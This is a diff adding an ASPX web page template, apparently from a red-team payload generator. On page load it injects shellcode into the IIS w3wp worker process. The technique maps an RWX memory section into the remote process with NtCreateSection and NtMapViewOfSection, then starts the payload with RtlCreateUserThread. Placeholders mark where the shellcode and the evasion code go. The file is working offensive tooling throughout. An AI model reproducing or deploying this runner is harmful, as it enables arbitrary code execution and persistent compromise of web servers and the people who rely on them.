@@ -1,0 +1,155 @@
+<%@ Page Language="C#" AutoEventWireup="true" Debug="true"%>
+<!-- Remove 'Debug="true"' from the above statement, as well as any comments below when ready for use.-->
+<h1> MyASPX Runner</h1>
+<p> Check out <a href=https://red.infiltr8.io>Infiltr8</a> for more!</p>
+
+<%@ Import Namespace="System" %>
+<%@ Import Namespace="System.Runtime.InteropServices" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Linq" %>
+<%@ Import Namespace="System.Diagnostics" %>
+//####INCLUDE####
+
+<script runat="server">
+        public const uint PROCESS_ALL_ACCESS     = 0x001F0FFF;
+        public const uint SECTION_MAP_READ       = 0x0004;
+        public const uint SECTION_MAP_WRITE      = 0x0002;
+        public const uint SECTION_MAP_EXECUTE    = 0x0008;
+        public const uint PAGE_READ_WRITE        = 0x04;
+        public const uint PAGE_READ_EXECUTE      = 0x20;
+        public const uint PAGE_EXECUTE_READWRITE = 0x40;
+        public const uint SEC_COMMIT             = 0x8000000;
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
+        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);
+
+        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
+        static extern int NtClose(IntPtr hObject);
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        // BEGIN DEBUG (imports)
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
+        static extern int memcmp(byte[] b1, byte[] b2, UIntPtr count);
+        
+        static bool CompareByteArray(byte[] b1, byte[] b2)
+        {
+            return b1.Length == b2.Length && memcmp(b1, b2, (UIntPtr)b1.Length) == 0;
+        }
+    //####DEFINE####
+
+    //####CODE####
+
+
+    protected void Page_Load(object sender, EventArgs esfd)
+    {
+
+        //####EVASION####
+
+        
+        byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
+
+        //####CALL####
+
+
+            int bufLength = buf.Length;
+            UInt32 uBufLength = (UInt32)bufLength;
+
+            // Get handle on a local process
+            IntPtr hLocalProcess = Process.GetCurrentProcess().Handle;
+
+            // Get handle on a remote process (by name)
+            string processName = "w3wp";
+            Process[] pList = Process.GetProcessesByName(processName);
+            if (pList.Length == 0)
+            {
+                Console.WriteLine("[-] No such process");
+                return;
+            }
+            int processId = pList.First().Id;
+            IntPtr hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
+            if (hRemoteProcess == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Failed to open remote process");
+                return;
+            }
+
+            // Create RWX memory section for the shellcode
+            IntPtr hSection = new IntPtr();
+            if (NtCreateSection(ref hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref uBufLength, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero) != 0)
+            {
+                Console.WriteLine("[-] Falied to create a section for the shellcode");
+                return;
+            }
+
+            // Map the view of created section into the LOCAL process's virtual address space (as R-W)
+            IntPtr baseAddressL = new IntPtr();
+            ulong sectionOffsetL = new ulong();
+            if (NtMapViewOfSection(hSection, hLocalProcess, ref baseAddressL, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetL, out uBufLength, 2, 0, PAGE_READ_WRITE) != 0)
+            {
+                Console.WriteLine("[-] Falied to map the view into local process's space");
+                return;
+            }
+            
+            // Map the view of (the same) created section into the REMOTE process's virtual address space (as R-E)
+            IntPtr baseAddressR = new IntPtr();
+            ulong sectionOffsetR = new ulong();
+            if (NtMapViewOfSection(hSection, hRemoteProcess, ref baseAddressR, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetR, out uBufLength, 2, 0, PAGE_READ_EXECUTE) != 0)
+            {
+                Console.WriteLine("[-] Falied to map the view into remote process's space");
+                return;
+            }
+
+            // Copy the shellcode into the locally mapped view which will be reflected on the remotely mapped view
+            Marshal.Copy(buf, 0, baseAddressL, bufLength);
+
+            // BEGIN DEBUG (check if the shellcode was copied correctly)
+            byte[] remoteMemory = new byte[bufLength];
+            IntPtr bytesRead = new IntPtr();
+            ReadProcessMemory(hRemoteProcess, baseAddressR, remoteMemory, remoteMemory.Length, out bytesRead);
+            if (!CompareByteArray(buf, remoteMemory))
+            {
+                Console.WriteLine("[-] DEBUG: Shellcode bytes read from remotely mapped view do not match with local buf");
+                return;
+            }
+            // END DEBUG
+
+            // Execute the shellcode in a remote thread (also can be done with CreateRemoteThread)
+            //CreateRemoteThread(hRemoteProcess, IntPtr.Zero, 0, baseAddressR, IntPtr.Zero, 0, IntPtr.Zero)
+            IntPtr threadHandle = new IntPtr();
+            if (RtlCreateUserThread(hRemoteProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, baseAddressR, IntPtr.Zero, ref threadHandle, IntPtr.Zero) != IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Failed to create a remote thread");
+                return;
+            }
+
+            Console.WriteLine("[+] Successfully injected shellcode into remote process ({processName}, {processId})");
+
+            // Clean up
+            NtUnmapViewOfSection(hLocalProcess, baseAddressL);
+            NtClose(hSection);
+    }
+
+</script>
